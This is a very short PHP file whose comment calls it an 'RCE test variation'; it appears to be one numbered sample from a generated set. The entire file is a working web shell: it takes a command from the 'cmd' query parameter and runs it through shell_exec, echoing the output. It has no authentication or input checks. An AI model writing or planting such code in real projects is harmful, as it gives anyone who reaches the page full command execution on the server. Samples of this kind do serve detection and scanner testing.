<?php
// RCE test variation #523
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>